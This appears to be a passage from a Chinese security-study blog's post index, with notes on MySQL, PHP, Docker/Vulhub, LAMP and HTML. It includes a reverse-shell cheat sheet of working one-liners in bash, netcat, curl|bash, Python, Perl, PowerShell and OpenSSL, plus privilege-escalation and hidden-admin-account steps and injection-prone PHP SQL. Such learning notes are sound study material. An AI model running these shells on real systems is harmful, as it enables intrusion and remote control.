(‘zs’,’title1’,’dasdasadadadad’);\n\n\nselect * from tb_test where xx;\n查询数据 * 可替换为指定键 where限定查询范围，查询表达式运算从前往后 xx可以为：&gt;、&lt;、=、like 分别对应数值匹配和字符串匹配，like搭配%使用（%n查询以n结尾的数据） select * from tb_news where content like ‘%n%’ 搜索content中包含n的内容 搜索范围使用and连接，标识并列，or连接表示或者 select * from tb_news where addtime &gt; ‘2021-06-23 16:48:46’ and (content like ‘%8%’ or id &lt; 16);\n\n\ndelete\n删除 delete from tb_news; 删除表格全部数据 delete from tb_news where id =18; 最小删除单位为行 查询限制条件同select\n\n\nupdate\n修改数据 update tb_news set author = ‘zs’, title = ‘hello’; 修改全部数据 update tb_news set author = ‘zs’, title = ‘hello’ where id=2; 修改id=2的指定数据\n\n\n\n\n\n\nalter table 表名 action\n修改表结构 action可以为： add 列名 建表语句 [first|afer 列名] 为表添加一列，默认列尾添加 add primary key(列名) 为表添加主键，已存在主键则报错 modify 列名 &lt;建表语句&gt; [first|after 列名] 更改列类型和列名称 drop 列名 删除一列 rename as 新表名 更改表名\n\n\n\n\n\n\n\\c\n放弃正在输入的命令\n\n\n\\h\n显示命令清单\n\n\n\\q\n退出mysql程序\n\n\n\\s\n查看mysql服务器状态\n\n\n补充：\n匹配用户名密码\nselect * from tb_users where uname = &#x27;admin&#x27; and upass = &#x27;123&#x27;;\n\n注册账户\ninsert INTO tb_users (uname,upass ,email) VALUE (&#x27;admin&#x27;,&#x27;123&#x27;,&#x27;123@qq.com&#x27;);\n\n修改密码\nupdate tb_users set upass = md5(&#x27;123123&#x27;) where uname=&#x27;admin&#x27;;\n\n修改表结构\nalter table tb_users MODIFY column upass varchar(50);\n\nPHP操作MYSQL数据库\n常用语句\n\n\n\n语句\n说明\n\n\n\n$db = mysqli_connect(‘127.0.0.1’,’root’,’root’);\n连接数据库软件 相当于：mysql -h ‘127.0.0.1’ -uroot -proot 在被包含的配置文件中，可使用全局变量$GLOBALS[‘db’]代替$db，使得$db参数可在全局使用\n\n\nmysqli_select_db($GLOBALS[‘db’],’db_bbs’);\n选择数据库\n\n\nmysqli_set_charset($GLOBALS[‘db’],’utf8’);\n设置数据库编码格式为utf8\n\n\n以上三句可写入config.php文件中，使用文件包含，避免冗余代码\n\n\n\n\n\n\n\n$res = mysqli_query($GLOBALS[‘db’],”SQL语句”);\n需要用变量接收，$res为资源类型数据(赋值后为对象类型)，使用$res-&gt;num_rows取数据（判断是否为空–数据库无此数据） 可在后面衔接or die(mysqli_error($GLOBALS[‘db’]));显示连接错误信息\n\n\n$res = mysqli_query($GLOBALS[‘db’],”INSERT INTO tb_users (uname,upass,email) VALUE (‘’$uname’,’$upass’,’$email’);”);\n新增用户信息至users表 若是包含变量，则最外层需要用双引号，否则变量不生效，内层用单引号，避免截断失效\n\n\n$res = mysqli_query($GLOBALS[‘db’],”DELETE FROM tb_users WHERE uname=’admin’; “);\n删除admin所在行，删除限定符必须唯一\n\n\n$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘&#49;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;](mailto:&#49;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;)’ WHERE uname=’admin’; “);\n修改admin密码邮箱\n\n\n$res = mysqli_query($GLOBALS[‘db’],”SELECT * FROM tb_users;”);\n查询全部数据，加where增加限制条件\n\n\n\n\n\n\n常用函数\n\n\n\nmysqli_fetch_all($res);\n取出数据库查询到的全部数据，以索引（下标）数组存储数据\n\n\nmysqli_fetch_array($res);\n一次取一个结果，索引、关联类型分别存储，有两份数据\n\n\nmysqli_fetch_row($res);\n一次取一个结果，索引类型存储\n\n\nmysqli_fetch_assoc($res);\n一次取一个结果，关联类型存储，推荐使用\n\n\n\n\n\n\n循环读取\n\n\n\nwhile($r = mysqli_fetch_assoc($res)){ mysqli_query($GLOBALS,”SQL语句’); }\nwhile循环执行命令，推荐使用\n\n\nfor($i=0; $i&lt;$res-&gt;num_rows; $i++){ mysqli_query($GLOBALS,”SQL语句”); }\nfor循环执行命令，$res-&gt;num_rows为数据查询的返回条数，为0则无查询结果 注意：哪怕无查询结果，返回数据也不为false，而是一个空的对象。\n\n\n","categories":["编程基础"],"tags":["PHP"]},{"title":"搭建Docker + Vulhub","url":"/article/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/","content":"安装dockersudo apt install docker.io -yyum install docker  \t# centos\tdocker -v\t#查看版本\n\n安装pip\nsudo apt install python3-pip -y\n\n安装docker-composepip3 install docker-composedocker-compose -v\t\t#查看版本\n\n拉取vulhub\ngit clone https://github.com/vulhub/vulhub.git\t\t#在桌面环境\n\n\n\nDocker命令docker pull xx:latest\t\t# 安装xx镜像docker images\t\t\t\t# 查看安装的镜像docker run -it -d -p 6379:6379 redis\t\t# 运行镜像\n\n\n\nDocker-compose命令docker-compose up -d\t\t#拉起容器镜像docker-compose down \t\t#关闭容器镜像\n","categories":["环境搭建"],"tags":["Docker"]},{"title":"Java环境变量配置","url":"/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/","content":"java8环境配置1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量\n2、新建 JAVA_HOME\nC:\\Program Files\\Java\\jdk1.8.0_281\t\t#根据具体路径更改\n\n3、新建 CLASSPATH\n.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar;\n\n4、修改 Path-新增\n%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;\n\n注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效\nC:\\Program Files\\Common Files\\Oracle\\Java\\javapath\n\n且移动环境变量配置于此行之上\nC:\\Program Files(x86)\\Common Files\\Oracle\\Java\\javapath\n\n最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示\njava11环境配置同上，无需修改\nJava版本切换1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）\n2、新建java8.bat\nsetx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m\n\n3、新建java11.bat\nsetx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m\n\n注：管理员权限运行\nKali家目录下执行\nvim .zshrc\n\n最后一行添加\nalias java8=&quot;java8路径/bin/java&quot;\n\n重新加载配置文件\nsource .zshrc\n","categories":["环境搭建"],"tags":["Java"]},{"title":"反弹shell归纳","url":"/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/","content":"Linux反弹shell归纳注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）\nBash反弹shellbash重定向，优先使用。\nbash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;# bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1\n\n以下是针对Bash反弹一句话进行了拆分说明：\n\n\n\n命令\n命令详解\n\n\n\nbash -i\n产生一个bash交互环境。\n\n\n&gt;&amp;\n将联合符号前面的内容与后面相结合，然后一起重定向给后者。\n\n\n/dev/tcp/47.xxx.xxx.72/2333\nLinux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。\n\n\n0&gt;&amp;1\n将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。\n\n\nBash反弹一句完整的解读过程就是：\nBash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。\n1、开启本地监听\nnc -lvvp 1111\n\n2、目标机反弹连接攻击机\nbash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;\n\n注意：利用工具写入反弹shell时，命令如下：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}\n其中，加密部分为bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密\nnetcat反弹shell1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。\nwget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean\n\n2、攻击机开启本地监听\nnetcat -lvvp 1111\n\n3、目标机主动连接攻击机\nnetcat 192.168.66.138 1111 -e /bin/bash# netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash\n\nCurl+Bash反弹shell借助Linux管道命令。\n1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：\nbash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1\n\n2、开启本地监听\nnc -lvvp 1111\n\n3、在目标机器上执行如下代码，即可反弹shell\ncurl 192.168.66.138|bash\n\ncurl IP | bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）\nSocat反弹shell1、安装\napt-get install socat\n\n2、攻击机开启本地监听\nsocat TCP-LISTEN:1111 -或nc -lvvp 1111\n\n3、目标机主动连接攻击机\nsocat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane\n\nTelnet反弹shell当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。\n方法一：\n1、攻击机开启本地监听：\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nmknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a\n\n方法二：\n1、攻击机开启两个本地监听：\nnc -lvvp 1111nc -lvvp 2222\n\n2、目标机主动连接攻击机：\ntelnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222\n3、攻击机1111端口执行命令，2222端口回显命令\nPython脚本反弹shell1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\nPHP脚本反弹shell1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机：\nphp -r &#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;\n\nPerl脚本反弹shell（后缀.pl）1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nperl -e &#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n\nRuby脚本反弹shell（后缀.rb）1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;或ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;\n\nJAVA反弹shell1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nr = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.x.x/1111;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()\n\nMetasploit生成反弹shell1、自动生成反弹一句话\nmsfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw\n\n其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell\n2、将生成的反弹shell直接在目标机器上执行即可\nPowershell反弹shell# 下载脚本执行powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -c 192.168.21.112 -p 9999 -e cmd# 下载powercat执行powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -l -p 9999\n\n\n\nOpenSSL反弹加密shell1、攻击机生成自签名证书：（填写信息全部回车即可）\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n\n2、在攻击机上使用OpenSSL监听一个端口\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 1111\n\n3、在目标机上进行反弹shell\nmkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s\n\n反弹shell后获取模拟终端上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。\n1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。\n2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。\n3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。\n若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：\npython -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\n","categories":["Web渗透"],"tags":["反弹shell"]},{"title":"创建用户+提权","url":"/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/","content":"前提：需要为管理员权限\nlinux环境1、创建普通用户useradd test\t#创建test用户passwd test\t\t#给test用户设置密码\n\n2、提权方法一：a、修改/etc/sudoers文件，将#去掉\n## Allows people in group wheel to run all commands%wheel    ALL=(ALL)    ALL\n\nb、然后修改用户，使其属于root组\nusermod -g root test\n\nc、使用test账号登录，su -切回root，再切回test即为root权限\n方法二：a、修改/etc/sudoers文件，找到root并添加\n## Allow root to run any commands anywhereroot    ALL=(ALL)     ALLtest   \tALL=(ALL)     ALL\n\nb、使用test账号登录，即可使用sudo权限操作\n如：sudo ls\n方法三：a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0\ntest:x:0:1000::/home/test:/bin/sh\n\nb、切换至test用户，输入test密码即可登陆至root账户\n3、删除用户userdel -r test\t\t#删除用户及其主目录\n\n注！非交互式shell修改密码echo &quot;test:123&quot; | chpasswdecho &quot;123&quot; | passwd --stdin &quot;test&quot;\n\n\n\nWindows环境1、创建普通用户net user test 123456 /add\t\t#添加test用户，密码为12356net user test$ 123456 /add\t\t#添加隐藏test用户，密码为12356\n\n2、添加用户至管理员组net localgroup administrators test /add\t\t#添加test用户至管理员组\n\n查看管理员组成员\nnet localgroup administrators\t\t#查看管理员组成员\n\n删除用户\nnet localgroup administrators test /del\t\t#删除用户\n\n禁用用户/启用用户\nnet user test /active:no\t\t#禁用test用户net user test /active:yes\t\t#启用test用户\n","categories":["Web渗透"],"tags":["提权"]},{"title":"JavaScript基础","url":"/article/JavaScript%E5%9F%BA%E7%A1%80/","content":"js调用方法（4种）\n\n\n语句\n执行\n\n\n\n&lt;script&gt;alert(1)&lt;/script&gt;\nscript标签中执行 –标签外（如body中） 推荐（不用点击，直接触发）\n\n\n&lt;script  src=&quot;x.js&quot;&gt;&lt;/script&gt; \n调用执行   –标签外\n\n\n&lt;a  href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;  \n伪协议触发（javascript不可少）–标签内   推荐\n\n\n&lt;p  onclick=&quot;alert(1)&quot;&gt;&lt;/p&gt;  \n事件触发   –标签内\n\n\njs事件\n\n\n事件\n说明\n\n\n\nWindows事件\n针对windows对象触发的事件，应用到body标签\n\n\nonafterprint\n打印之后触发的事件\n\n\nonbeforeprint\n打印之前触发的事件\n\n\nonerror\n发生错误（文件加载错误等）时触发的事件，常跟不存在的图片，用来执行js触发xss漏洞\n\n\nonload\n页面加载完成后立即发生\n\n\nonresize\n窗口大小被改变时触发的事件\n\n\nonunload\n页面下载或刷新网页时触发事件\n\n\n\n\n\n\nForm事件\n由HTML表单内的动作触发的事件，应用到几乎所有的HTML元素，最常用在Form元素\n\n\nonblur\n当元素失去焦点（鼠标移出等）时触发的事件\n\n\nonchange\n输入框的值发生变化或者下拉列表框选项触发的事件\n\n\nonfocus\n当元素获得焦点时触发的事件\n\n\nonformchange\n当表单被改变时触发的事件\n\n\noninput\n当元素获得用户输入时触发的事件\n\n\nonselect\n元素中文本被选中后触发的事件\n\n\nonsubmit\n提交表单时触发的事件\n\n\n\n\n\n\nKeyboard事件\n\n\n\nonkeydown\n用户按下按键时触发的事件\n\n\nonkeypress\n用户敲击按钮时触发的事件\n\n\nonkeyup\n用户释放按键时触发的事件\n\n\n\n\n\n\nMouse事件\n由鼠标或类似用户动作触发的事件\n\n\nonclick\n元素上发生鼠标点击时触发的事件\n\n\nondblclick\n元素上发生鼠标双击时触发的事件\n\n\nonmousedown\n当元素上按下鼠标按钮时触发的事件\n\n\nonmousemove\n当鼠标指针移动到元素上时触发的事件\n\n\nonmouseover\n当鼠标指针移动到元素上时触发的事件\n\n\nonmouseout\n当鼠标指针移出元素时触发的事件\n\n\nonmouseup\n当在元素上释放鼠标按钮时触发的事件\n\n\n更多事件访问文档：https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\nDOM操作\n\n\n使用\n命令\n\n\n\n通过ID获取\ndocument.getElementById()\n\n\n通过标签名称获取（结果有多个，以数组形式存放）\ndocunment.getElementsByTagName()\n\n\n通过对象名称获取（结果有多个，以数组形式存放）\ndocumemt.getElementsByClassName()\n\n\n\n\n\ndocument事件操作\n\n\n\n\n动态添加事件\ndocument.getElementById(“x”).addEventListener(“click”,function(){ }) 给img添加点击事件 document.getElementById(“x”).addEventListener(“click”,function(){ alert(“这是图片”) })\n\n\n创建标签\ndocument.createElement(“img”) #创建img标签 创建img标签，并添加属性 img = document.createElement(“img”) img.src = “x.jpg” img.style.width = “100px” … 可以创建script标签实现跨站脚本攻击  \n\n\n应用\ndocument.body.appendChild() 执行添加/创建（否则不显示）\n\n\n","categories":["编程基础"],"tags":["JavaScript"]},{"title":"Windows搭建IIS+MSSql","url":"/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/","content":"一、搭建IIS服务1、搭建IIS服务开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）\n2、导入ASP网站选择网站路径\n修改网站访问端口号\n3、网站配置\n\n\n报错类型\n做法\n\n\n\n403（无访问主程序）\n修改默认文档，增加index.asp\n\n\n500（无法访问文件）\nASP-启用父路径\n\n\n提示未启用32位程序池\n应用程序池-网站-高级设置-32位应用程序池-True\n\n\n没有操作权限\n修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制\n\n\n安装SQL Server数据库并导入原有数据库1、winserver2008连接sql server镜像，选择安装（精简功能）\n\n2、限制数据库权限（从管理员权限降权）\n\n3、混合模式，设置密码，添加管理员\n\n4、后续全部确认即可\n5、新建数据库（testdb）\n6、修改网站数据库配置文件，数据库类型为mssql\n7、替换网站原有数据库\n8、修改网站数据库配置文件\n新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）\n注意：mssql账号为sa\n","categories":["环境搭建"],"tags":["IIS"]},{"title":"搭建LAMP环境","url":"/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/","content":"LAMP：Linux+Apache+Mysql+PHP\n1、安装Apache（httpd）yum install httpd httpd-devel httpd-manual httpd-tools\n\n2、启动apache并设置开机自启systemctl start httpd\t\t#开启apachesystemctl enable httpd\t\t#设置开机自启systemctl status httpd\t\t#查看apache状态\n\n3、安装Mysqlyum install mariadb-server\n\n4、启动Mysql并设置开机自启systemctl start mariadb\t\t\t#开启mariadbsystemctl enable mariadb\t\t#设置开机自启systemctl status mariadb\t\t#查看mariadb状态\n\n5、配置Mysql数据库mysql_secure_installation\t\t#初始化mysql数据库（全部回车确认）\n\n设置mysql密码（非操作系统密码）\n6、安装PHP(php-fpm php-mysqlnd不装，其他均可)\nyum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap\n\n7、重启apache使php生效（php不是独立软件，依附apache）\nsystemctl restart httpd\n\n8、解压WP网站9、复制WP网站文件至Apache网站目录cp -r WP/* /var/www/html\n\n10、赋予Apache网站apache权限（apache服务由apache账户运行，还权限，安全控制）\nchown -R apache:apache /var/www/html\n\n11、禁用SELinux（安全访问控制，影响网站访问）\nvi /etc/sysconfig/selinux修改SELINUX=disabled重启操作系统（reboot）\n\n12、访问网站ip+80端口，安装wp网站13、此时需要设置mysql账户mysql -uroot -p\t\t\t# 启动mysql（需要输入mysql密码）create database wp_web;\t# 创建mysql账户exit\t\t\t\t\t# 退出mysql\n\n（注意！wp-config.php 删除可重装wp网站）\n14、其他/var/www/html\t\t\t\t\t# Apache默认网站路径/etc/httpd/conf/httpd.conf\t\t# Apache配置文件路径\n\n修改DocumentRoot “/var/www”即可修改网站路径\n \n","categories":["环境搭建"],"tags":["Apache"]},{"title":"HTML、CSS基础","url":"/article/HTML%E3%80%81CSS%E5%9F%BA%E7%A1%80/","content":"HTML：HTML不是编程语言，而是标记语言，用来描述网页\nHTML基础语法及标签\n\n\n\n标签\n说明\n\n\n\n&lt;!DOCTYPE&gt;  \n&lt;!DOCTYPE&gt;  不是HTML标记语言，而是声明，它是指示 web 浏览器关于页面使用哪个  HTML 版本进行编写的指令 &lt;!DOCTYPE  html&gt; \n\n\n&lt;meta  charset=&quot;utf-8&quot;&gt;  \n对于中文网页需要声明编码方式，否则会乱码  &lt;meta  charset=&quot;gbk&quot;&gt;  设置gbk编码\n\n\n &lt;!---  ---&gt; \n注释  &lt;!---这是一个注释---&gt;  \n\n\n\n\n\n\n完整的HTML页面\n\n\n\n&lt;!DOCTYPE  html&gt;\n声明\n\n\n&lt;html&gt;&lt;/html&gt; \n最外层框架，告知是html框架\n\n\n&lt;head&gt;&lt;/head&gt;\n头部元素，包含编码语言和页面标题\n\n\n&lt;meta  charset=&quot;utf-8&quot;&gt;\n声明编码\n\n\n&lt;title&gt;&lt;/title&gt;\n网页标题  &lt;title&gt;Hello&lt;/title&gt;\n\n\n&lt;body&gt;&lt;/body&gt;\n网页主题，是网页的内容部分  &lt;body&gt;  &lt;p&gt;这是正文&lt;/p&gt;  &lt;/body&gt;\n\n\n上述标签关系如图，是网页的最小构成单元\n\n\n\n\n\n\n\n常用标签\n\n\n\n&lt;h1&gt;&lt;/h1&gt;\n标题  h1-h6，标题级别（字体大小）由大到小  &lt;h1&gt;这是最大级别标题&lt;/h1&gt;\n\n\n&lt;p&gt;&lt;/p&gt;\n段落  &lt;p&gt;这是一个段落&lt;/p&gt;\n\n\n&lt;hr&gt;  \n线\n\n\n&lt;pre&gt;&lt;/pre&gt;\n预格式化文本容器,会保留空格和换行符\n\n\n&lt;br/&gt;\n换行，直接插入段落，没有闭合标签\n\n\n&lt;a&gt;&lt;/a&gt;\n链接  &lt;a  href=&quot;https://www.baidu.com&quot;&gt;这是百度链接&lt;/a&gt;\n\n\n&lt;img&gt; \n图片，注意，图片标签不是成对出现  &lt;img  src=&quot;1.jpg&quot;&gt;\n\n\n&lt;ul&gt;&lt;/ul&gt;：无序列表  &lt;ol&gt;&lt;/ol&gt;：有序列表  &lt;li&gt;&lt;/li&gt;：列表项\n列表  &lt;ol&gt;  &lt;li&gt;有序列表1&lt;/li&gt;&lt;li&gt;有序列表2&lt;/li&gt;  &lt;/ol&gt;\n\n\n&lt;table&gt;&lt;/table&gt;：表格&lt;tr&gt;&lt;/tr&gt;：行  &lt;td&gt;&lt;/td&gt;：格  &lt;th&gt;&lt;/th&gt;：表格头(加粗加黑) \n创建表格  &lt;table&gt;   &lt;tr&gt;    &lt;th&gt;Month&lt;/th&gt;    &lt;th&gt;Savings&lt;/th&gt;   &lt;/tr&gt;   &lt;tr&gt;    &lt;td&gt;January&lt;/td&gt;    &lt;td&gt;$100&lt;/td&gt;   &lt;/tr&gt;  &lt;/table&gt;\n\n\n\n\n\n\nHTML表单\n\n\n\n&lt;form&gt;&lt;/form&gt;\n定义表单  &lt;form  action=&quot;www.baidu.com&quot; method=&quot;get&quot;  enctype=&quot;application/x-www-form-urlencoded&quot;&gt;这是表单&lt;/form&gt;  action：表明表单将要提交到哪里  method：表示提交用的方法分别为get和post可选  enctype：规定在发送表单数据前对数据进行编码格式\n\n\n&lt;INPUT&gt;\n表单域标记  &lt;INPUT  type= &quot;text&quot; name= &quot;文本框名称&quot; value= &quot;文本框值&quot; size=  &quot;文本框的宽度&quot; maxlength=  &quot;文本框中能输入的最大长度&quot; &gt;  value：输入框默认文本\n\n\ntype\n表单类型  text：单行文本框  password：密码框，输入值以点代替  checkbox：复选框  radio：单选按钮  submit：提交按钮  button：自定义按钮\n\n\nvalue\n默认文本\n\n\nplaceholder\n提示文字\n\n\n&lt;div&gt;&lt;/div&gt;\n块元素，可以存放文本、图片等，用来对整体设置属性\n\n\n&lt;textarea&gt;&lt;/textarea&gt;\n格式及属性  &lt;TEXTAREA  name= &quot;名称&quot; rows=  &quot;最大可视行数&quot; cols=  &quot;最大可视列数&quot; &gt;默认多行文本 &lt;/TEXTAREA&gt;\n\n\n&lt;select&gt;&lt;/select&gt;  &lt;option&gt;&lt;/option&gt;\n多选表单  &lt;SELECT name= &quot;&quot; size= &quot;&quot; &gt; &lt;OPTION  value= &quot; &quot; &gt; 选项1 &lt;/OPTION&gt;&lt;OPTION  value= &quot; &quot; &gt; 选项2 &lt;/OPTION&gt; &lt;/SELECT&gt;\n\n\n补充：\nHTTP请求方式\n\n\n\n方法\n说明\n\n\n\nGET\n发起一个请求来获得服务器上的某一资源，通过一组HTTP头和呈现数据返回客户端，GET请求中永远不会包含呈现数据\n\n\nHEAD\n与GET类似，但是HEAD只含有HTTP头信息，不含有呈现数据。侧重判断某个资源是否存在。\n\n\nPOST\n向服务器提交数据，使用最为广泛\n\n\nPUT\n与POST类似，但是PUT指定了资源存放的位置，POST数据存放位置则由服务器决定。少见\n\n\nDELETE\n删除资源。少见。\n\n\nOPTIONS\n获取当前URL所支持的方法，若请求成功，会在HTTP头中更包含一个名为Allow的头，值是所支持的方法\n\n\nCSSCSS是一种用来装饰HTML的标记集合，是对HTML标记的一种扩展，可以进一步美化HTML页面\n语法\n选择符+声明（声明=属性+属性值）           属性 值              属性 值   h1&#123;   color:red;     front-size:14px&#125;  选择器    声明          声明\n\n引用方式\n\n\n\n方式\n说明\n\n\n\n内联样式\n在HTML元素中使用style属性，只对当前标记里的内容有效   &lt;p  style=&quot;display:none&quot;&gt;&lt;/p&gt;\n\n\n内部样式表\n在HTML文档头部head区域使用&lt;style&gt;元素，包含CS，全局声明，调用  &lt;style  type=&quot;text/css&quot;&gt; 选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;选择符 &#123; 样式属性:属性值; 样式属性:属性值;……&#125;&lt;/style&gt;\n\n\n外部引用\n外部CSS，通过&lt;link&gt;标签引入外部的CSS文件 &lt;link  rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;样式表文件的地址&quot;&gt;\n\n\n内部样式表总结\n\n\n\n样式\n语法\n\n\n\n类选择符\n&lt;style  type=&quot;text/css&quot;&gt;  .sfont&#123;  font-size:12px; color:red;  &#125;&lt;/style&gt; &lt;p  class=&quot;sfont&quot;&gt;…&lt;/p&gt; \n\n\nID选择符\n&lt;style  type=&quot;text/css&quot;&gt;#sfont&#123; font-size:12px;color:red;  &#125; &lt;/style&gt;    &lt;p id=&quot;sfont&quot;&gt;…&lt;/p&gt;  \n\n\n类型选择符\n&lt;style  type=&quot;text/css&quot;&gt; p&#123;font-size:12px;color:red;  &#125;&lt;/style&gt;   &lt;p&gt;…&lt;/p&gt; \n\n\n样式表冲突\n当多种样式作用于同一标记的同一属性时，会发生样式表冲突\n优先原则\n同一选择符：按就近原则\n不同选择符：内联 &gt; ID &gt; 类 &gt; 类型 &gt; 外部\n定位符\n\n\n\n方式\n说明\n\n\n\nposition\n\n\n\nfixed绝对定位\n&lt;view  style=&#39;position:fixed;bottom:100rpx;right:100rpx&#39;&gt;  &lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;\n\n\nabsolute绝对定位\n&lt;view  style=&#39;position:absolute;&#39;&gt; &lt;image style=&#39; width:102px;  height:110px&#39; src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;  在没有使用 “left”, “top”, “right” 以及 “bottom” 属性之前，基于文档流的位置停留在在文档流之外，  随着滚动并不一直停留在屏幕中。     &lt;view  style=&#39;position:absolute;bottom:100rpx;right:100rpx&#39;&gt;  &lt;image style=&#39; width:102rpx;  height:110rpx&#39;  